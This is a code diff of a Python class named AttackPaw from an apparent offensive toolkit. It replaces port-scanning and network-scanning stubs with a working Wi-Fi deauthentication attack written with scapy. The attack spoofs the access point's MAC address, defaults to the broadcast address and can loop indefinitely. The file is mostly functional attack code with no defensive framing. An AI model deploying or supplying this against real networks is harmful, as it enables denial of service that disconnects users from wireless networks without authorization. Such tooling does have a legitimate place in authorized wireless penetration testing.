@@ -1,38 +1,64 @@
 from paws.util_paw import UtilPaw
+import platform
+if platform.system() == 'Darwin':
+    from scapy.all import Dot11, Dot11Deauth, RadioTap, sendp
+else:
+    from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap
+    from scapy.sendrecv import sendp
 
 class AttackPaw:
 
-    _util_paw = None
+    __util_paw = None
 
-    # scapy imports
-    Dot11Beacon = None
-    Dot11 = None
-    Dot11Elt = None
-    sniff = None
+    # general
+    _verbose = False
 
-    # port scanning
-    _target = None
-    _maxprocesses = None
-    _maxthreads = None
+    # deauth
+    _interface = ''
+    _target_mac = ''
+    _target_network_mac = ''
+    _interval = .1
+    _count = 0
 
-    # scanning for networks
-    _networks_found = {}
-    _prev_length = 0
+    def __init__(self, util_paw: UtilPaw) -> None:
+        self.__util_paw = util_paw
 
-    def __init__(self, options, util_paw: UtilPaw) -> None:
-        self._util_paw = util_paw
+    def set_verbose(self, verbose: bool):
+        self._verbose = verbose
 
-        method = options['mthd']
-        if method == 'ports':
-            self.__set_target(options['target'])
-            self.__set_maxprocesses(options['maxprocesses'])
-            self.__set_maxthreads(options['maxthreads'])
-        
-        elif method == 'networks':
-            self.set_automode(options['automode'])
-            self.set_interface(options['interface'])
-            super().__init__(options, self._util_paw)
-            self.__init_scapy_util()
+    def set_target_network_mac(self, target_network_mac: str):
+        self._target_network_mac  = target_network_mac
+
+    def set_target_mac(self, target_mac: str):
+        self._target_mac = 'ff:ff:ff:ff:ff:ff' if not target_mac else target_mac # if target_mac not defined use broadcast
+
+    def set_interface(self, interface: str):
+        self._interface = interface
     
-    def __init_scapy_deauth_util(self):
-        pass
+    def set_interval(self, interval: float):
+        self._interval = interval
+
+    def set_count(self, count: int):
+        self._count = count
+    
+    def deauth(self):
+
+        self.__util_paw.print_attack_deauth_info()
+
+        # 802.11 frame
+        dot11 = Dot11(
+            addr1=self._target_mac, # destination MAC
+            addr2=self._target_network_mac, # source MAC
+            addr3=self._target_network_mac, # Access Point MAC
+        )
+        # stack them up
+        packet = RadioTap()/dot11/Dot11Deauth(reason=7)
+        # send the packet
+        sendp(
+            x=packet,
+            inter=self._interval,
+            count=self._count,
+            loop=not self._count,
+            iface=self._interface,
+            verbose=True,
+        )
